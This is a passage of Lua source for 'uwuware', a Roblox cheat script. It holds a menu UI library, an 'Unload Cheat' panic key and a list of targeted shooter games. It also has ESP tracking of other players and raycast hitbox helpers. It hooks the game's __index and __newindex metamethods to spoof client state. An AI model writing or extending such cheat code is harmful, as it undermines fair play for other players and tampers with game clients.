				})

				local layout = library:Create("UIListLayout", {
					HorizontalAlignment = Enum.HorizontalAlignment.Center,
					SortOrder = Enum.SortOrder.LayoutOrder,
					Padding = UDim.new(0, 12),
					Parent = self.main
				})

				library:Create("UIPadding", {
					PaddingTop = UDim.new(0, 8),
					PaddingLeft = UDim.new(0, 2),
					PaddingRight = UDim.new(0, 2),
					Parent = self.main
				})

				layout.Changed:connect(function()
					self.main.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 14)
				end)

				for _, section in next, self.sections do
					if section.canInit and #section.options > 0 then
						section:Init()
					end
				end
			end

			if library.hasInit and self.hasInit then
				column:Init()
			end

			return column
		end

		function tab:Init()
			if self.hasInit then return end
			self.hasInit = true
			local size = textService:GetTextSize(self.title, 18, Enum.Font.Code, Vector2.new(9e9, 9e9)).X + 10

			self.button = library:Create("TextLabel", {
				Position = UDim2.new(0, library.tabSize, 0, 22),
				Size = UDim2.new(0, size, 0, 30),
				BackgroundTransparency = 1,
				Text = self.title,
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 15,
				Font = Enum.Font.Code,
				TextWrapped = true,
				ClipsDescendants = true,
				Parent = library.main
			})
			library.tabSize = library.tabSize + size

			self.button.InputBegan:connect(function(input)
				if input.UserInputType.Name == "MouseButton1" then
					library:selectTab(self)
				end
			end)

			for _, column in next, self.columns do
				if column.canInit then
					column:Init()
				end
			end
		end

		if self.hasInit then
			tab:Init()
		end

		return tab
	end

	function library:AddWarning(warning)
		warning = typeof(warning) == "table" and warning or {}
		warning.text = tostring(warning.text) 
		warning.type = warning.type == "confirm" and "confirm" or ""

		local answer
		function warning:Show()
			library.warning = warning
			if warning.main and warning.type == "" then return end
			if library.popup then library.popup:Close() end
			if not warning.main then
				warning.main = library:Create("TextButton", {
					ZIndex = 2,
					Size = UDim2.new(1, 0, 1, 0),
					BackgroundTransparency = 0.6,
					BackgroundColor3 = Color3.new(),
					BorderSizePixel = 0,
					Text = "",
					AutoButtonColor = false,
					Parent = library.main
				})

				warning.message = library:Create("TextLabel", {
					ZIndex = 2,
					Position = UDim2.new(0, 20, 0.5, -60),
					Size = UDim2.new(1, -40, 0, 40),
					BackgroundTransparency = 1,
					TextSize = 16,
					Font = Enum.Font.Code,
					TextColor3 = Color3.new(1, 1, 1),
					TextWrapped = true,
					RichText = true,
					Parent = warning.main
				})

				if warning.type == "confirm" then
					local button = library:Create("TextLabel", {
						ZIndex = 2,
						Position = UDim2.new(0.5, -105, 0.5, -10),
						Size = UDim2.new(0, 100, 0, 20),
						BackgroundColor3 = Color3.fromRGB(40, 40, 40),
						BorderColor3 = Color3.new(),
						Text = "Yes",
						TextSize = 16,
						Font = Enum.Font.Code,
						TextColor3 = Color3.new(1, 1, 1),
						Parent = warning.main
					})

					library:Create("ImageLabel", {
						ZIndex = 2,
						Size = UDim2.new(1, 0, 1, 0),
						BackgroundTransparency = 1,
						Image = "rbxassetid://2454009026",
						ImageColor3 = Color3.new(),
						ImageTransparency = 0.8,
						Parent = button
					})

					library:Create("ImageLabel", {
						ZIndex = 2,
						Size = UDim2.new(1, 0, 1, 0),
						BackgroundTransparency = 1,
						Image = "rbxassetid://2592362371",
						ImageColor3 = Color3.fromRGB(60, 60, 60),
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 62, 62),
						Parent = button
					})

					local button1 = library:Create("TextLabel", {
						ZIndex = 2,
						Position = UDim2.new(0.5, 5, 0.5, -10),
						Size = UDim2.new(0, 100, 0, 20),
						BackgroundColor3 = Color3.fromRGB(40, 40, 40),
						BorderColor3 = Color3.new(),
						Text = "No",
						TextSize = 16,
						Font = Enum.Font.Code,
						TextColor3 = Color3.new(1, 1, 1),
						Parent = warning.main
					})

					library:Create("ImageLabel", {
						ZIndex = 2,
						Size = UDim2.new(1, 0, 1, 0),
						BackgroundTransparency = 1,
						Image = "rbxassetid://2454009026",
						ImageColor3 = Color3.new(),
						ImageTransparency = 0.8,
						Parent = button1
					})

					library:Create("ImageLabel", {
						ZIndex = 2,
						Size = UDim2.new(1, 0, 1, 0),
						BackgroundTransparency = 1,
						Image = "rbxassetid://2592362371",
						ImageColor3 = Color3.fromRGB(60, 60, 60),
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 62, 62),
						Parent = button1
					})

					button.InputBegan:connect(function(input)
						if input.UserInputType.Name == "MouseButton1" then
							answer = true
						end
					end)

					button1.InputBegan:connect(function(input)
						if input.UserInputType.Name == "MouseButton1" then
							answer = false
						end
					end)
				else
					local button = library:Create("TextLabel", {
						ZIndex = 2,
						Position = UDim2.new(0.5, -50, 0.5, -10),
						Size = UDim2.new(0, 100, 0, 20),
						BackgroundColor3 = Color3.fromRGB(30, 30, 30),
						BorderColor3 = Color3.new(),
						Text = "OK",
						TextSize = 16,
						Font = Enum.Font.Code,
						TextColor3 = Color3.new(1, 1, 1),
						Parent = warning.main
					})

					library:Create("ImageLabel", {
						ZIndex = 2,
						Size = UDim2.new(1, 0, 1, 0),
						BackgroundTransparency = 1,
						Image = "rbxassetid://2454009026",
						ImageColor3 = Color3.new(),
						ImageTransparency = 0.8,
						Parent = button
					})

					library:Create("ImageLabel", {
						ZIndex = 2,
						AnchorPoint = Vector2.new(0.5, 0.5),
						Position = UDim2.new(0.5, 0, 0.5, 0),
						Size = UDim2.new(1, -2, 1, -2),
						BackgroundTransparency = 1,
						Image = "rbxassetid://3570695787",
						ImageColor3 = Color3.fromRGB(50, 50, 50),
						Parent = button
					})

					button.InputBegan:connect(function(input)
						if input.UserInputType.Name == "MouseButton1" then
							answer = true
						end
					end)
				end
			end
			warning.main.Visible = true
			warning.message.Text = warning.text

			repeat wait()
			until answer ~= nil
			spawn(warning.Close)
			library.warning = nil
			return answer
		end

		function warning:Close()
			answer = nil
			if not warning.main then return end
			warning.main.Visible = false
		end

		return warning
	end

	function library:Close()
		self.open = not self.open
		if self.open then
			inputService.MouseIconEnabled = false
		else
			inputService.MouseIconEnabled = self.mousestate
		end
		if self.main then
			if self.popup then
				self.popup:Close()
			end
			self.main.Visible = self.open
			self.cursor.Visible  = self.open
			self.cursor1.Visible  = self.open
		end
	end

	function library:Init()
		if self.hasInit then return end
		self.hasInit = true

		self.base = library:Create("ScreenGui", {IgnoreGuiInset = true, ZIndexBehavior = Enum.ZIndexBehavior.Global})
		if runService:IsStudio() then
			self.base.Parent = script.Parent.Parent
		else
			pcall(function() self.base.Parent = gethui() end)
		end

		self.main = self:Create("ImageButton", {
			AutoButtonColor = false,
			Position = UDim2.new(0, 100, 0, 46),
			Size = UDim2.new(0, 500, 0, 600),
			BackgroundColor3 = Color3.fromRGB(20, 20, 20),
			BorderColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Tile,
			Modal = true,
			Visible = false,
			Parent = self.base
		})

		self.top = self:Create("Frame", {
			Size = UDim2.new(1, 0, 0, 50),
			BackgroundColor3 = Color3.fromRGB(30, 30, 30),
			BorderColor3 = Color3.new(),
			Parent = self.main
		})

		self:Create("TextLabel", {
			Position = UDim2.new(0, 6, 0, -1),
			Size = UDim2.new(0, 0, 0, 20),
			BackgroundTransparency = 1,
			Text = tostring(self.title),
			Font = Enum.Font.Code,
			TextSize = 18,
			TextColor3 = Color3.new(1, 1, 1),
			TextXAlignment = Enum.TextXAlignment.Left,
			Parent = self.main
		})

		table.insert(library.theme, self:Create("Frame", {
			Size = UDim2.new(1, 0, 0, 1),
			Position = UDim2.new(0, 0, 0, 24),
			BackgroundColor3 = library.flags["Menu Accent Color"],
			BorderSizePixel = 0,
			Parent = self.main
		}))

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2454009026",
			ImageColor3 = Color3.new(),
			ImageTransparency = 0.4,
			Parent = top
		})

		self.tabHighlight = self:Create("Frame", {
			BackgroundColor3 = library.flags["Menu Accent Color"],
			BorderSizePixel = 0,
			Parent = self.main
		})
		table.insert(library.theme, self.tabHighlight)

		self.columnHolder = self:Create("Frame", {
			Position = UDim2.new(0, 5, 0, 55),
			Size = UDim2.new(1, -10, 1, -60),
			BackgroundTransparency = 1,
			Parent = self.main
		})

		self.cursor = self:Create("Triangle", {
			Color = Color3.fromRGB(180, 180, 180),
			Transparency = 0.6,
		})
		self.cursor1 = self:Create("Triangle", {
			Color = Color3.fromRGB(240, 240, 240),
			Transparency = 0.6,
		})

		self.tooltip = self:Create("TextLabel", {
			ZIndex = 2,
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			TextSize = 15,
			Font = Enum.Font.Code,
			TextColor3 = Color3.new(1, 1, 1),
			Visible = true,
			Parent = self.base
		})

		self:Create("Frame", {
			AnchorPoint = Vector2.new(0.5, 0),
			Position = UDim2.new(0.5, 0, 0, 0),
			Size = UDim2.new(1, 10, 1, 0),
			Style = Enum.FrameStyle.RobloxRound,
			Parent = self.tooltip
		})

		self:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = self.main
		})

		self:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = self.main
		})

		self.top.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				dragObject = self.main
				dragging = true
				dragStart = input.Position
				startPos = dragObject.Position
				if library.popup then library.popup:Close() end
			end
		end)
		self.top.InputChanged:connect(function(input)
			if dragging and input.UserInputType.Name == "MouseMovement" then
				dragInput = input
			end
		end)
		self.top.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				dragging = false
			end
		end)

		function self:selectTab(tab)
			if self.currentTab == tab then return end
			if library.popup then library.popup:Close() end
			if self.currentTab then
				self.currentTab.button.TextColor3 = Color3.fromRGB(255, 255, 255)
				for _, column in next, self.currentTab.columns do
					column.main.Visible = false
				end
			end
			self.main.Size = UDim2.new(0, 16 + ((#tab.columns < 2 and 2 or #tab.columns) * 239), 0, 600)
			self.currentTab = tab
			tab.button.TextColor3 = library.flags["Menu Accent Color"]
			self.tabHighlight:TweenPosition(UDim2.new(0, tab.button.Position.X.Offset, 0, 50), "Out", "Quad", 0.2, true)
			self.tabHighlight:TweenSize(UDim2.new(0, tab.button.AbsoluteSize.X, 0, -1), "Out", "Quad", 0.1, true)
			for _, column in next, tab.columns do
				column.main.Visible = true
			end
		end

		spawn(function()
			while library do
				wait(1)
				local Configs = self:GetConfigs()
				for _, config in next, Configs do
					if not table.find(self.options["Config List"].values, config) then
						self.options["Config List"]:AddValue(config)
					end
				end
				for _, config in next, self.options["Config List"].values do
					if not table.find(Configs, config) then
						self.options["Config List"]:RemoveValue(config)
					end
				end
			end
		end)

		for _, tab in next, self.tabs do
			if tab.canInit then
				tab:Init()
				self:selectTab(tab)
			end
		end

		self:AddConnection(inputService.InputEnded, function(input)
			if input.UserInputType.Name == "MouseButton1" and self.slider then
				self.slider.slider.BorderColor3 = Color3.new()
				self.slider = nil
			end
		end)

		self:AddConnection(inputService.InputChanged, function(input)
			if not self.open then return end
			
			if input.UserInputType.Name == "MouseMovement" then
				if self.cursor then
					local mouse = inputService:GetMouseLocation()
					local MousePos = Vector2.new(mouse.X, mouse.Y)
					self.cursor.PointA = MousePos
					self.cursor.PointB = MousePos + Vector2.new(12, 12)
					self.cursor.PointC = MousePos + Vector2.new(12, 12)
					self.cursor1.PointA = MousePos
					self.cursor1.PointB = MousePos + Vector2.new(11, 11)
					self.cursor1.PointC = MousePos + Vector2.new(11, 11)
				end
				if self.slider then
					self.slider:SetValue(self.slider.min + ((input.Position.X - self.slider.slider.AbsolutePosition.X) / self.slider.slider.AbsoluteSize.X) * (self.slider.max - self.slider.min))
				end
			end
			if input == dragInput and dragging and library.draggable then
				local delta = input.Position - dragStart
				local yPos = (startPos.Y.Offset + delta.Y) < -36 and -36 or startPos.Y.Offset + delta.Y
				dragObject:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, yPos), "Out", "Quint", 0.1, true)
			end
		end)

		local Old_index
		Old_index = hookmetamethod(game, "__index", function(t, i)
			if checkcaller() then return Old_index(t, i) end

			if library and i == "MouseIconEnabled" then
				return library.mousestate
			end

			return Old_index(t, i)
		end)

		local Old_new
		Old_new = hookmetamethod(game, "__newindex", function(t, i, v)
			if checkcaller() then return Old_new(t, i, v) end

			if library and i == "MouseIconEnabled" then
				library.mousestate = v
				if library.open then return end
			end

			return Old_new(t, i, v)
		end)

		if not getgenv().silent then
			delay(1, function() self:Close() end)
		end
	end

	library.SettingsTab = library:AddTab("Settings", 100)
	library.SettingsColumn = library.SettingsTab:AddColumn()
	library.SettingsColumn1 = library.SettingsTab:AddColumn()

	library.SettingsMain = library.SettingsColumn:AddSection"Main"
	library.SettingsMain:AddButton({text = "Unload Cheat", nomouse = true, callback = function()
		library:Unload()
		getgenv().uwuware = nil
	end})
	library.SettingsMain:AddBind({text = "Panic Key", callback = library.options["Unload Cheat"].callback})

	library.SettingsMenu = library.SettingsColumn:AddSection"Menu"
	library.SettingsMenu:AddBind({text = "Open / Close", flag = "UI Toggle", nomouse = true, key = "Insert", callback = function() library:Close() end})
	library.SettingsMenu:AddColor({text = "Accent Color", flag = "Menu Accent Color", color = Color3.fromRGB(255, 65, 65), callback = function(Color)
		if library.currentTab then
			library.currentTab.button.TextColor3 = Color
		end
		for _, obj in next, library.theme do
			obj[(obj.ClassName == "TextLabel" and "TextColor3") or (obj.ClassName == "ImageLabel" and "ImageColor3") or "BackgroundColor3"] = Color
		end
	end})
	local Backgrounds = {
		["Floral"] = 5553946656,
		["Flowers"] = 6071575925,
		["Circles"] = 6071579801,
		["Hearts"] = 6073763717,
		["Polka dots"] = 6214418014,
		["Mountains"] = 6214412460,
		["Zigzag"] = 6214416834,
		["Zigzag 2"] = 6214375242,
		["Tartan"] = 6214404863,
		["Roses"] = 6214374619,
		["Hexagons"] = 6214320051,
		["Leopard print"] = 6214318622
	}
	library.SettingsMenu:AddList({text = "Background", flag = "UI Background", max = 6, values = {"Floral", "Flowers", "Circles", "Hearts", "Polka dots", "Mountains", "Zigzag", "Zigzag 2", "Tartan", "Roses", "Hexagons", "Leopard print"}, callback = function(Value)
		if Backgrounds[Value] then
			library.main.Image = "rbxassetid://" .. Backgrounds[Value]
		end
	end}):AddColor({flag = "Menu Background Color", color = Color3.new(), callback = function(Color)
		library.main.ImageColor3 = Color
	end, trans = 1, calltrans = function(Value)
		library.main.ImageTransparency = 1 - Value
	end})
	library.SettingsMenu:AddSlider({text = "Tile Size", value = 90, min = 50, max = 500, callback = function(Value)
		library.main.TileSize = UDim2.new(0, Value, 0, Value)
	end})

	library.ConfigSection = library.SettingsColumn1:AddSection"Configs"
	library.ConfigSection:AddBox({text = "Config Name", skipflag = true})
	library.ConfigSection:AddButton({text = "Create", callback = function()
		library:GetConfigs()
		writefile(library.foldername .. "/" .. library.flags["Config Name"] .. library.fileext, "{}")
		library.options["Config List"]:AddValue(library.flags["Config Name"])
	end})
	library.ConfigWarning = library:AddWarning({type = "confirm"})
	library.ConfigSection:AddList({text = "Configs", skipflag = true, value = "", flag = "Config List", values = library:GetConfigs()})
	library.ConfigSection:AddButton({text = "Save", callback = function()
		local r, g, b = library.round(library.flags["Menu Accent Color"])
		library.ConfigWarning.text = "Are you sure you want to save the current settings to config <font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. library.flags["Config List"] .. "</font>?"
		if library.ConfigWarning:Show() then
			library:SaveConfig(library.flags["Config List"])
		end
	end})
	library.ConfigSection:AddButton({text = "Load", callback = function()
		local r, g, b = library.round(library.flags["Menu Accent Color"])
		library.ConfigWarning.text = "Are you sure you want to load config <font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. library.flags["Config List"] .. "</font>?"
		if library.ConfigWarning:Show() then
			library:LoadConfig(library.flags["Config List"])
		end
	end})
	library.ConfigSection:AddButton({text = "Delete", callback = function()
		local r, g, b = library.round(library.flags["Menu Accent Color"])
		library.ConfigWarning.text = "Are you sure you want to delete config <font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. library.flags["Config List"] .. "</font>?"
		if ConfigWarning:Show() then
			local Config = library.flags["Config List"]
			if table.find(library:GetConfigs(), Config) and isfile(library.foldername .. "/" .. Config .. library.fileext) then
				library.options["Config List"]:RemoveValue(Config)
				delfile(library.foldername .. "/" .. Config .. library.fileext)
			end
		end
	end})
	--LIBRARY END
	
	--custom notification thing, library required for this to work
	local LastNotification = 0
	function library:SendNotification(duration, message)
		LastNotification = LastNotification + tick()
		if LastNotification < 0.2 or not library.base then return end
		LastNotification = 0
		if duration then
			duration = tonumber(duration) or 2
			duration = duration < 2 and 2 or duration
		else
			duration = message
		end
		message = message and tostring(message) or "Empty"

		--create the thing
		local notification = library:Create("Frame", {
			AnchorPoint = Vector2.new(1, 1),
			Size = UDim2.new(0, 0, 0, 80),
			Position = UDim2.new(1, -5, 1, -5),
			BackgroundTransparency = 1,
			BackgroundColor3 = Color3.fromRGB(30, 30, 30),
			BorderColor3 = Color3.fromRGB(20, 20, 20),
			Parent = library.base
		})
		tweenService:Create(notification, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 240, 0, 80), BackgroundTransparency = 0}):Play()

		tweenService:Create(library:Create("TextLabel", {
			Position = UDim2.new(0, 5, 0, 25),
			Size = UDim2.new(1, -10, 0, 40),
			BackgroundTransparency = 1,
			Text = tostring(message),
			Font = Enum.Font.SourceSans,
			TextColor3 = Color3.fromRGB(255, 255, 255),
			TextSize = 18,
			TextTransparency = 1,
			TextWrapped = true,
			Parent = notification
		}), TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0.3), {TextTransparency = 0}):Play()

		--bump existing notifications
		for _,notification in next, library.notifications do
			notification:TweenPosition(UDim2.new(1, -5, 1, notification.Position.Y.Offset - 85), "Out", "Quad", 0.2)
		end
		library.notifications[notification] = notification

		wait(0.4)

		--create other things
		library:Create("Frame", {
			Position = UDim2.new(0, 0, 0, 20),
			Size = UDim2.new(0, 0, 0, 1),
			BackgroundColor3 = Color3.fromRGB(255, 65, 65),
			BorderSizePixel = 0,
			Parent = notification
		}):TweenSize(UDim2.new(1, 0, 0, 1), "Out", "Linear", duration)

		tweenService:Create(library:Create("TextLabel", {
			Position = UDim2.new(0, 4, 0, 0),
			Size = UDim2.new(0, 70, 0, 16),
			BackgroundTransparency = 1,
			Text = "uwuware",
			Font = Enum.Font.Gotham,
			TextColor3 = Color3.fromRGB(255, 65, 65),
			TextSize = 16,
			TextTransparency = 1,
			Parent = notification
		}), TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

		--remove
		delay(duration, function()
			if not library then return end
			library.notifications[notification] = nil
			--bump existing notifications down
			for _,otherNotif in next, library.notifications do
				if otherNotif.Position.Y.Offset < notification.Position.Y.Offset then
					otherNotif:TweenPosition(UDim2.new(1, -5, 1, otherNotif.Position.Y.Offset + 85), "Out", "Quad", 0.2)
				end
			end
			notification:Destroy()
		end)
	end

	local GameTitle = ""
	local GameList = {
		["Counter Blox"] = 115797356,
		["Arsenal"] = 111958650,
		["Bad Business"] = 1168263273,
		--["Sound Space"] = 964540701,
		["Island Royale"] = 1320186298,
		--["Strucid"] = 833423526,
		["Unit: Classified"] = 4292776423,
		["Phantom Forces"] = 113491250,
		--["Apocalypse Rising 2"] = 1,
		["Operation Scorpion"] = 571399053,
		["Q-Clash!"] = 715769634,
		--["Future Tops"] = 656683441,
		--["Jailbreak"] = 245662005,
		["MURDER"] = 1484197505,
		["Ace Of Spadez"] = 913400159,
		["KAT"] = 254394801,
		["MMC Zombies Project"] = 410307227,
		["Recoil"] = 1534453623,
		["Project Lazarus"] = 169302362,
		["State Of Anarchy"] = 595270616,
		--["Hedgerows"] = 1631887111,
		--["Notoriety"] = 16680835,
		["Zombie Rush"] = 63955796,
		["Zombie Attack"] = 504035427,
		--["Infection"] = 1457889951,
		["Resurrection"] = 298118708,
		--["Typical Colors 2"] = 147332621,
		--["Blackhawk Rescue Mission"] = 5321709389,
		["Shoot Out"] = 1581656817,
		["Weaponry"] = 3297964905,
		["Citadel Of Adun"] = 4790960806,
		["Dust"] = 1944529780,
		--sadrad
		["Boxing Simulator"] = 4058282580,
		["BIG Paintball"] = 3527629287,
		["Giant Survival"] = 4003872968,
		--["Lumberjack Legends"] = 4379619839,
		--["Magnet Simulator"] = 3486025575,
		["Death Zone"] = 1069365631,
		["R2DA"] = 1772081673,
		["Zombie Uprising"] = 1709832923
	}
	for Name,ID in next, GameList do
		if game.GameId == ID then
			GameTitle = Name
		elseif game.PlaceId == ID then
			GameTitle = Name
		end
	end

	--Compatibility functions
	local function mouse1click(delay) spawn(function() mouse1press() wait(delay or 0.1) mouse1release() end) end
	local function mouse2click(delay) spawn(function() keypress(0x02) wait(delay or 0.1) keprelease(0x02) end) end
	local function keytap(key, delay) spawn(function() keypress(key) wait(delay or 0.1) keyrelease(key) end) end

	--Variables
	local RepStorage = game:GetService"ReplicatedStorage"
	local PlayerServ = game:GetService"Players"
	local Client = PlayerServ["LocalPlayer"]
	local Mouse = Client:GetMouse()
	local Settings = settings()
	local Players = {}
	local Camera = workspace.CurrentCamera
	local WTSP = Camera.WorldToScreenPoint
	local WTVP = Camera.WorldToViewportPoint
	local CameraSpoof = {
		FieldOfView = Camera.FieldOfView
	}
	local Lighting = game:GetService"Lighting"
	local LightingSpoof = {
		ClockTime = Lighting.ClockTime,
		Brightness = Lighting.Brightness,
		Ambient = Lighting.Ambient,
		OutdoorAmbient = Lighting.OutdoorAmbient,
		ColorShift_Top = Lighting.ColorShift_Top,
	}
	local NameRequest
	local TeamRequest
	local HealthRequest
	local ClientCharRequest
	local Cowboys, Sheriffs = {}, {}
	local FFC = workspace.FindFirstChild
	local GBB = workspace.GetBoundingBox
	local FFA = workspace.FindFirstAncestor
	local FFCoC = workspace.FindFirstChildOfClass
	local V3Empty = Vector3.new()
	local V3101 = Vector3.new(1, 0, 1)
	local V2Empty = Vector2.new()
	local V211 = Vector2.new(1, 1)
	local V222 = Vector2.new(2, 2)
	local V233 = Vector2.new(3, 3)

	local UniversalBodyParts = {
		"Head",
		"UpperTorso", "LowerTorso", "Torso",
		"Left Arm", "LeftUpperArm", "LeftLowerArm", "LeftHand",
		"Right Arm", "RightUpperArm", "RightLowerArm", "RightHand",
		"Left Leg", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
		"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"
	}
	local BBBodyParts = {
		"Head", "Neck",
		"Chest", "Abdomen", "Hips",
		"LeftHand", "LeftArm", "LeftForearm",
		"RightHand", "RightArm", "RightForearm",
		"LeftFoot", "LeftLeg", "LeftForeleg",
		"RightFoot", "RightLeg", "RightForeleg"
	}
	local R6BodyParts = {"Head","Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}
	local AOSBodyParts = {
		"Head",
		"Shoulders", "Torso", "UpperTorso", "MidTorso", "LowerTorso",
		"UpperLeftArm", "LowerLeftArm", "LeftHandle",
		"UpperLeftLeg", "LowerLeftLeg", "LeftFoot",
		"UpperRightArm", "LowerRightArm", "RightHandle",
		"UpperRightLeg", "LowerRightLeg", "RightFoot"
	}
	local SOABodyParts = {
		"Head",
		"Base",
		"LeftArmUpper", "LeftArmMid", "LeftArmLower",
		"RightArmUpper", "RightArmMid", "RightArmLower",
		"LeftLegUpper", "LeftLegMid", "LeftLegLower",
		"RightLegUpper", "RighLegMid", "RightLegLower",
	}
	local UseBodyParts = GameTitle == "Bad Business" and BBBodyParts or GameTitle == "Phantom Forces" and R6BodyParts or GameTitle == "Ace Of Spadez" and AOSBodyParts or GameTitle == "State Of Anarchy" and SOABodyParts or UniversalBodyParts

	--Get functions
	local function GetHitboxFromChar(Character, BodyPart)
		BodyPart = BodyPart or "Head"
		if not Character then return end
		if GameTitle == "Bad Business" then
			return FFC(Character.Body, BodyPart) or FFC(Character.Body, "Chest")
		elseif GameTitle == "Project Lazarus" then
			BodyPart = BodyPart == "Head" and "HeadBox" or "Torso"
			return FFC(Character, BodyPart)
		else
			return FFC(Character, BodyPart) or FFC(Character, "UpperTorso")
		end
	end

	local RayParams = RaycastParams.new()
	RayParams.FilterType = Enum.RaycastFilterType.Blacklist
	RayParams.IgnoreWater = true
	local function RayCheck(ClientChar, To, Distance)
		local Ignores = {Camera, ClientChar}
		if GameTitle == "Bad Business" then
			Ignores[3] = FFC(workspace, "Arms")
			--Ignores[#Ignores + 1] = ClientChar and FFC(workspace, ClientChar.Backpack.Equipped.Value.Name)
			Ignores[4] = workspace.NonProjectileGeometry
			Ignores[5] = workspace.Effects
			Ignores[6] = workspace.Spawns
			Ignores[7] = workspace.Ragdolls
			Ignores[8] = workspace.Gameplay
			Ignores[9] = workspace.Throwables
		elseif GameTitle == "Phantom Forces" then
			Ignores[3] = workspace.Ignore
		end
		RayParams.FilterDescendantsInstances = Ignores
		return workspace:Raycast(Camera.CFrame.p, (To - Camera.CFrame.p).Unit * Distance, RayParams)
	end

	local Sub = Vector3.new(-0.1, -0.1, -0.1)
	local function GetCorners(Object, Esp)
		local CF = Object.CFrame
		local Size = (Object.Size / 2)
		Size = Esp and Size or Size - Sub
		return {
			Vector3.new(CF.X+Size.X, CF.Y+Size.Y, CF.Z+Size.Z);
			Vector3.new(CF.X-Size.X, CF.Y+Size.Y, CF.Z+Size.Z);

			Vector3.new(CF.X-Size.X, CF.Y-Size.Y, CF.Z-Size.Z);
			Vector3.new(CF.X+Size.X, CF.Y-Size.Y, CF.Z-Size.Z);

			Vector3.new(CF.X-Size.X, CF.Y+Size.Y, CF.Z-Size.Z);
			Vector3.new(CF.X+Size.X, CF.Y+Size.Y, CF.Z-Size.Z);

			Vector3.new(CF.X-Size.X, CF.Y-Size.Y, CF.Z+Size.Z);
			Vector3.new(CF.X+Size.X, CF.Y-Size.Y, CF.Z+Size.Z);
		}
	end

	--Player data
	local ESPObjects = {}

	local function Track(Player)
		-- too lazy to add a proper check, discontinued anyway so
		if not (Player.ClassName == "Player" or Player.ClassName == "Folder") then return end

		for i,v in next, ESPObjects do
			if not v.Active then
				v.Active = true
				ESPObjects[Player] = v
				break
			end
		end
		if not ESPObjects[Player] then
			ESPObjects[Player] = {
				ChamsOutline = library:Create("Folder", {Parent = library.base}),
				Chams = library:Create("Folder", {Parent = library.base}),
				ChamsStep = 0,
				BoxOutline = library:Create("Square", {Thickness = 1}),
				BoxInline = library:Create("Square", {Thickness = 1}),
				Box = library:Create("Square", {Thickness = 1}),
				LookAt = library:Create("Line", {Thickness = 1}),
				NameText = library:Create("Text", {Size = 15, Font = 3, Center = true, Outline = true}),
				DistanceText = library:Create("Text", {Size = 15, Font = 3, Center = true, Outline = true}),
				BarOutline = library:Create("Square", {Filled = true}),
				Bar = library:Create("Square", {Filled = true}),
				HealthText = library:Create("Text", {Color = Color3.new(1, 1, 1), Size = 14, Font = 3, Center = true, Outline = true}),
				DirectionLine = library:Create("Line", {Thickness = 1}),
				DirectionDot = library:Create("Square", {Size = Vector2.new(7, 7), Filled = true}),
				--RadarHeight = library:Create("TextLabel", {BackgroundTransparency = 1, Text = "T", TextColor3 = Color3.new(), Font = Enum.Font.SciFi, TextSize = 13}),
				RadarBlip = library:Create("Circle", {Radius = 4, Filled = true}),
				OOVArrow = library:Create"Triangle",
				Active = true,

				Invis = function()
					ESPObjects[Player].Visible = false
					ESPObjects[Player].BoxOutline.Visible = false
					ESPObjects[Player].BoxInline.Visible = false
					ESPObjects[Player].Box.Visible = false
					ESPObjects[Player].BarOutline.Visible = false
					ESPObjects[Player].Bar.Visible = false
					ESPObjects[Player].HealthText.Visible = false
					ESPObjects[Player].LookAt.Visible = false
					ESPObjects[Player].NameText.Visible = false
					ESPObjects[Player].DistanceText.Visible = false
					ESPObjects[Player].DirectionLine.Visible = false
					ESPObjects[Player].DirectionDot.Visible = false
				end,

				InvisChams = function()
					ESPObjects[Player].ChamsVisible = false
					for _, Cham in next, ESPObjects[Player].Chams:GetChildren() do
						Cham.Transparency = 1
					end
				end,

				InvisChamsOutline = function()
					ESPObjects[Player].ChamsOutlineVisible = false
					for _, Cham in next, ESPObjects[Player].ChamsOutline:GetChildren() do
						Cham.Transparency = 1
					end
				end,

				InvisRadar = function()
					ESPObjects[Player].RadarVisible = false
					ESPObjects[Player].RadarBlip.Visible = false
				end
			}
		end

		local Character
		local MaxHealth
		Players[Player] = setmetatable({Priority = false, Whitelist = false, LastPosition = V3Empty}, {__index = function(self, index)
			if index == "Character" then
				if Player.ClassName == "Model" then
					Character = Player
				else
					if GameTitle == "Phantom Forces" then
						if Player == Client then
							Character = Client.Character and FFC(Client.Character, "HumanoidRootPart") and Client.Character
						else
							if NameRequest[Player] and NameRequest[Player].torso then
								Character = NameRequest[Player].torso.Parent
							end
						end
					elseif GameTitle == "Bad Business" then
						Character = NameRequest[Player]
						Character = Character and Character.Parent == workspace.Characters and Character
					elseif GameTitle == "Operation Scorpion" then
						Character = FFC(Player, "Vars") and Player.Vars["isAlive"].Value and Player.Character
					elseif GameTitle == "Hedgerows" then
						Character = Player.Character and Player.Character.Parent and Player.Character
